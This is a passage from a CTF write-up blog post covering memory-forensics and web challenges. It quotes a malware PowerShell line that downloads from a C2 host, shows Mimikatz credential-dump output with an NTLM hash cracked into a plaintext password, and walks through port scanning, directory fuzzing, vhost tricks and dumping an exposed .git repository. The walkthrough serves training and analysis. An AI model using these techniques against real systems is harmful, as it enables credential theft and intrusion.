+$dAtA = $7a6eD.DOWnLOadDaTa($ser + $t);
+</code></pre><p>The full C2 URL:</p>
+<pre tabindex=0><code>http://172.16.194.129:80/admin/get.php
+</code></pre><p>The answer: /admin/get.php</p>
+<h2 id=stage-2>Stage #2</h2>
+<blockquote>
+<p>Q: The malware calls &ldquo;home&rdquo; constantly after that. What is the URI the malware is contacting?</p>
+</blockquote>
+<p>We can see the malware populating following C2 URI after the first download:</p>
+<pre tabindex=0><code>GET /login/process.php HTTP/1.1
+Cookie: session=MmbeesIwk8I37sqq47aA2qA1LwA=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+</code></pre><p>The answer: /login/process.php</p>
+<h2 id=agent>Agent</h2>
+<blockquote>
+<p>Q: There&rsquo;s a malware calling &ldquo;home&rdquo;. What is the user-agent the malware is using?</p>
+</blockquote>
+<p>From the previous challenges:</p>
+<pre tabindex=0><code>GET /login/process.php HTTP/1.1
+Cookie: session=MmbeesIwk8I37sqq47aA2qA1LwA=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+</code></pre><p>The answer: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</p>
+<h2 id=injection>Injection</h2>
+<blockquote>
+<p>Q: One of the processes was injected. What is the process id (PID) of that process?</p>
+</blockquote>
+<p>In this case, there was no clear file signatures available in the malfind output.</p>
+<p>However, malfind has way to dump ERW sections for further analysis:</p>
+<pre tabindex=0><code>~$ vol.py -f finalboss.mem --profile=Win10x64_17763 malfind -D malfind
+</code></pre><p>After that we can grep the MZ header from hex dump:</p>
+<pre tabindex=0><code>~$ hexdump -C *|grep -i &quot;4d 5a&quot;      
+00002350  c3 ff ff ff 48 8b f8 8d  75 01 b8 4d 5a 00 00 66  |....H...u..MZ..f|
+00003b50  cc cc cc 48 83 ec 18 4c  8b c1 b8 4d 5a 00 00 66  |...H...L...MZ..f|
+000144c0  8b c1 b9 4d 5a 00 00 66  39 08 74 03 33 c0 c3 48  |...MZ..f9.t.3..H|
+</code></pre><p>The file header seems to be there but in odd location.</p>
+<p>The svchost.exe also has &ldquo;This program can not be run in DOS mode.&rdquo; basic header that is in every PE format executable.</p>
+<p>The answer is the PID: 7736</p>
+<h2 id=password>Password</h2>
+<blockquote>
+<p>Q: What is Rodrigo Gonzales' password?</p>
+</blockquote>
+<p>This is another tricky one for a reason&mldr; The person who made the dump (not me) screw up the password spelling. :D</p>
+<p>However, it was solvable&mldr; Let&rsquo;s figure it out:</p>
+<p>We can see from the strings that Mimikatz has been executed on the system:</p>
+<pre tabindex=0><code>~$ strings -e l finalboss.mem &gt; Q: strings_utf.txt
+~$ grep -i &quot;sekurlsa&quot; strings_utf.txt
+mimikatz(powershell) # sekurlsa::logonpasswords
+~$ grep -i &quot;mimikatz(powershell) # sekurlsa::logonpasswords&quot; -A100 strings_utf.txt
+mimikatz(powershell) # sekurlsa::logonpasswords
+Authentication Id : 0 ; 1076056 (00000000:00106b58)
+Session           : Interactive from 1
+User Name         : Rodrigo Gonzales
+Domain            : WORKSTATION
+Logon Server      : WORKSTATION
+Logon Time        : 12/02/2020 22.54.23
+SID               : S-1-5-21-2034586335-2782532192-897599191-1001
+	msv :
+	 [00000003] Primary
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * NTLM     : 8ab015e5cc1302d061dfefe6fb3dce12
+	 * SHA1     : b2ecd0de4dc885e66ac28546558761c5e40a5ce1
+	tspkg :
+	wdigest :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	kerberos :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	ssp :
+	credman :
+Authentication Id : 0 ; 1076008 (00000000:00106b28)
+Session           : Interactive from 1
+User Name         : Rodrigo Gonzales
+Domain            : WORKSTATION
+Logon Server      : WORKSTATION
+Logon Time        : 12/02/2020 22.54.23
+SID               : S-1-5-21-2034586335-2782532192-897599191-1001
+	msv :
+	 [00000003] Primary
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * NTLM     : 8ab015e5cc1302d061dfefe6fb3dce12
+	 * SHA1     : b2ecd0de4dc885e66ac28546558761c5e40a5ce1
+	tspkg :
+	wdigest :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	kerberos :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	ssp :
+	credman :
+</code></pre><p>Let&rsquo;s put this hash to file and try cracking them:</p>
+<pre tabindex=0><code>~$ echo &quot;Rodrigo Gonzales:1001:8ab015e5cc1302d061dfefe6fb3dce12:8ab015e5cc1302d061dfefe6fb3dce12:::&quot; &gt; Q: hash.txt
+~$ sudo john --format=NT -w /usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2020-07-23 08:50) 0g/s 18873Kp/s 18873Kc/s 18873KC/s      markinho..*7¡Vamos!
+Session completed
+</code></pre><p>Maybe we should get better wordlist? Let&rsquo;s try this one: <a href=https://github.com/jvesiluoma/wordlists/blob/master/fin-swe-passwdlist.7z>https://github.com/jvesiluoma/wordlists/blob/master/fin-swe-passwdlist.7z</a></p>
+<pre tabindex=0><code>~$ wget https://github.com/jvesiluoma/wordlists/raw/master/fin-swe-passwdlist.7z
+~$ 7z x fin-swe-passwdlist.7z
+~$ sudo john --format=NT --wordlist=fin-swe-passwdlist.7z hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2020-07-23 08:57) 0g/s 3637Kp/s 3637Kc/s 3637KC/s ..
+Session completed
+</code></pre><p>No bonus. This list was supposed to have the password. However, it might be in cleartext in memory so let&rsquo;s make password list from memory:</p>
+<pre tabindex=0><code>$ cat strings_endian.txt|sort -u &gt; Q: from_memory.txt
+$ sudo john --format=NT --wordlist=from_memory.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+perse500!        (Rodrigo Gonzales)
+1g 0:00:00:00 DONE (2020-07-23 08:59) 20.00g/s 11533Kp/s 11533Kc/s 11533KC/s Perse..\PersistentAddinsRegistered
+Use the &quot;--show --format=NT&quot; options to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>Password for Rodrigo Gonzales is &ldquo;perse500!&rdquo;. The password was supposed to be Perse500, which is on <a href=https://twitter.com/jvesiluoma>jvesiluoma&rsquo;s</a> combination list.</p>
+<hr>
+<h1 id=challenges---q-web>Challenges -> Q: Web</h1>
+<h2 id=discovering-tcp-1>Discovering TCP #1</h2>
+<blockquote>
+<p>Q: What abnormal TCP port is open on target.helsec.fi?</p>
+</blockquote>
+<p>Let&rsquo;s NMAP</p>
+<pre tabindex=0><code>~$ sudo nmap target.helsec.fi -v
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 14:27 EDT
+Initiating Ping Scan at 14:27
+Scanning target.helsec.fi (167.71.0.121) [4 ports]
+Completed Ping Scan at 14:27, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:27
+Completed Parallel DNS resolution of 1 host. at 14:27, 0.00s elapsed
+Initiating SYN Stealth Scan at 14:27
+Scanning target.helsec.fi (167.71.0.121) [1000 ports]
+Discovered open port 80/tcp on 167.71.0.121
+Discovered open port 22/tcp on 167.71.0.121
+Discovered open port 31337/tcp on 167.71.0.121
+Completed SYN Stealth Scan at 14:28, 53.24s elapsed (1000 total ports)
+Nmap scan report for target.helsec.fi (167.71.0.121)
+Host is up (0.038s latency).
+Not shown: 997 filtered ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+31337/tcp open  Elite
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 53.39 seconds
+          Raw packets sent: 2040 (89.580KB) | Rcvd: 1050 (42.037KB)
+</code></pre><p>The port 31337 is not normal.</p>
+<h2 id=discovering-tcp-2>Discovering TCP #2</h2>
+<blockquote>
+<p>Q: Can you interact with the port 31337/tcp on target.helsec.fi?</p>
+</blockquote>
+<pre tabindex=0><code> ~$ host target.helsec.fi
+target.helsec.fi has address 167.71.0.121
+~$ nc -nv 167.71.0.121 31337
+(UNKNOWN) [167.71.0.121] 31337 (?) open
+PLZ ANSWER SOMETHING
+SOMETHING
+flag{INTERACTING_WITH_SOCKETS_IS_EZ}
+</code></pre><h2 id=discovering-udp>Discovering UDP</h2>
+<blockquote>
+<p>Q: What abnormal UDP port is open on target.helsec.fi?</p>
+</blockquote>
+<p>I&rsquo;ve no idea what I&rsquo;ve been thinking when I created the challenge. The listener I coded does not response anything which means there&rsquo;s no way to solve this challenge out. =)</p>
+<p>The answer however was 13.</p>
+<h2 id=web-1>Web #1</h2>
+<blockquote>
+<p>Q: Find the secret admin panel on <a href=http://target.helsec.fi>http://target.helsec.fi</a>.</p>
+</blockquote>
+<p>Let&rsquo;s fuzz the web:</p>
+<pre tabindex=0><code>~$ ffuf -u http://target.helsec.fi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt                                              
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+index.html              [Status: 200, Size: 368, Words: 41, Lines: 18]
+personals               [Status: 301, Size: 169, Words: 5, Lines: 8]
+web-console             [Status: 301, Size: 169, Words: 5, Lines: 8]
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+~$ curl -L http://target.helsec.fi/web-console
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.19.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+~$ curl -L http://target.helsec.fi/personals  
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.19.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre><p>Okay. We found personals and web-console directories, let&rsquo;s continue:</p>
+<pre tabindex=0><code>~$ ffuf -u http://target.helsec.fi/web-console/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/web-console/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+~$ ffuf -u http://target.helsec.fi/personals/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/personals/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</code></pre><p>Nothing :(</p>
+<p>Let&rsquo;s change wordlist:</p>
+<pre tabindex=0><code>~$ ffuf -u http://target.helsec.fi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+/web-console/           [Status: 403, Size: 153, Words: 3, Lines: 8]
+/web-console/Invoker    [Status: 200, Size: 25, Words: 1, Lines: 2]
+:: Progress: [2439/2439] :: Job [1/1] :: 1219 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+~$ curl http://target.helsec.fi/web-console/Invoker
+flag{TH1S_WAS_QUICK_HIT}
+</code></pre><p>Boom, we got a flag: flag{TH1S_WAS_QUICK_HIT}</p>
+<h2 id=web-2>Web #2</h2>
+<blockquote>
+<p>Q: There&rsquo;s a png file on <a href=http://target.helsec.fi>http://target.helsec.fi</a>. Find it.</p>
+</blockquote>
+<p>Let&rsquo;s see if there is png files in the personals directory we found in the previous challenge:</p>
+<pre tabindex=0><code>~$ ffuf -u http://target.helsec.fi/personals/FUZZ.png -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/personals/FUZZ.png
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+whois                   [Status: 200, Size: 40, Words: 1, Lines: 2]
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</code></pre><p>OMG! A photo of me, this can&rsquo;t be good:</p>
+<pre tabindex=0><code>curl http://target.helsec.fi/personals/whois.png
+flag{THANK_GOD_THERE_WAS_NO_PHOTO_HERE}
+</code></pre><p>What the flag says&mldr; flag{THANK_GOD_THERE_WAS_NO_PHOTO_HERE}</p>
+<h2 id=web-3>Web #3</h2>
+<blockquote>
+<p>Q: Check the other project on <a href=http://target.helsec.fi>http://target.helsec.fi</a> as well.</p>
+</blockquote>
+<p>There&rsquo;s some other project mentioned on the front page:</p>
+<pre tabindex=0><code>~$ curl http://target.helsec.fi
+&lt;!doctype html&gt;
+
+&lt;html lang=&quot;en&quot;&gt;
+	&lt;head&gt;
+		  &lt;meta charset=&quot;utf-8&quot;&gt;
+
+		    &lt;title&gt;Target site&lt;/title&gt;
+		      &lt;meta name=&quot;description&quot; content=&quot;This beautiful site was made by whois&quot;&gt;
+		        &lt;meta name=&quot;author&quot; content=&quot;whois&quot;&gt;
+
+	&lt;/head&gt;
+
+	&lt;body&gt;
+		&lt;h1&gt;Target website&lt;/h1&gt;
+		&lt;p&gt;Check my &lt;a href=&quot;http://loremipsum.helsec.fi&quot;&gt;blog project&lt;/a&gt; Q: too.
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>Let&rsquo;s check it:</p>
+<pre tabindex=0><code>~$ host loremipsum.helsec.fi
+loremipsum.helsec.fi has address 127.0.0.1
+</code></pre><p>The domain is pointing to localhost, maybe it&rsquo;s a <a href=https://www.webopedia.com/TERM/V/virtual_host.html>vhost</a>?</p>
+<pre tabindex=0><code>~$ curl -H &quot;Host: loremipsum.helsec.fi&quot; http://target.helsec.fi
+flag{VHOSTS_ARE_OFTEN_USED_IN_HAXXOR_CHALLENGES}
+</code></pre><p>Aaaand we got a flag!!!</p>
+<h2 id=web-4>Web #4</h2>
+<blockquote>
+<p>Q: There&rsquo;s something more in <a href=http://loremipsum.helsec.fi>http://loremipsum.helsec.fi</a>&mldr;. Can you find it?</p>
+</blockquote>
+<p>Time to fuff again:</p>
+<pre tabindex=0><code>~$ ffuf -H &quot;Host: loremipsum.helsec.fi&quot; -u http://target.helsec.fi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Header           : Host: loremipsum.helsec.fi
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
+index.html              [Status: 200, Size: 49, Words: 1, Lines: 2]
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</code></pre><p>OMG, there&rsquo;s a git repo. Let&rsquo;s get it using <a href=https://github.com/arthaud/git-dumper>git-dumper</a>! But first add the vhost to hosts file:</p>
+<pre tabindex=0><code>cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+167.71.0.121	target.helsec.fi loremipsum.helsec.fi
+</code></pre><p>Now we are good to go:</p>
+<pre tabindex=0><code>git-dumper.py http://loremipsum.helsec.fi/.git/HEAD dump
+[-] Testing http://loremipsum.helsec.fi/.git/HEAD [200]
+[-] Testing http://loremipsum.helsec.fi/.git/ [403]
+[-] Fetching common files
+[-] Fetching http://loremipsum.helsec.fi/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://loremipsum.helsec.fi/.gitignore [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/description [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/post-commit.sample [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/post-receive.sample [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/post-update.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-push.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/update.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/info/packs [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/index [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/info/exclude [200]
+[-] Finding refs/
+[-] Fetching http://loremipsum.helsec.fi/.git/FETCH_HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/HEAD [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/config [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/info/refs [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/ORIG_HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/HEAD [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/remotes/origin/HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/heads/master [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/remotes/origin/master [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/stash [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/packed-refs [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/heads/master [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/remotes/origin/HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/remotes/origin/master [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/stash [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/wip/wtree/refs/heads/master [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/wip/index/refs/heads/master [404]
+[-] Finding packs
+[-] Finding objects
+[-] Fetching objects
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/6f/509d1e83a851aa621036f3d0770e44c4969eba [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/d3/e4d4e4aea12282ec91aa6c5888d7bc0969b413 [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/9d/472888c48febd2d52c88109bfae948751ec780 [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/00/00000000000000000000000000000000000000 [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/b6/59f196ba24a08e044fe09c46557dad20a01522 [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/96/8186f4d13375526fed7966fdd783dd6d5bcaef [200]
+[-] Running git checkout .
+</code></pre><p>The directory contains only one file:</p>
+<pre tabindex=0><code>~$ ls dump
+flag.txt
+~$ cat dump/flag.txt
+flag{LEAVING_GITS_OPEN_LIKE_THIS_IS_DANGEROUS}
+</code></pre><p>The flag is: flag{LEAVING_GITS_OPEN_LIKE_THIS_IS_DANGEROUS}</p>
+<hr>
+</div>
+</article>
+<hr>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a href=https://who1s.github.io/categories/tools/>tools</a></span>
+<span class=tag><a href=https://who1s.github.io/categories/training/>training</a></span>
+</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+5256 Words
+</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+2020-07-23 14:00
+</p>
+</div>
+<hr>
+<div class=sharing-buttons>
+<a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f" target=_blank rel=noopener aria-label title="Share on facebook">
+<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f" target=_blank rel=noopener aria-label title="Share on twitter">
+<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF&caption=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF&canonicalUrl=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f" target=_blank rel=noopener aria-label title="Share on tumblr">
+<div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="mailto:?subject=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF&body=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f" target=_self rel=noopener aria-label title="Share via email">
+<div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</div>
+</div>
+</a>
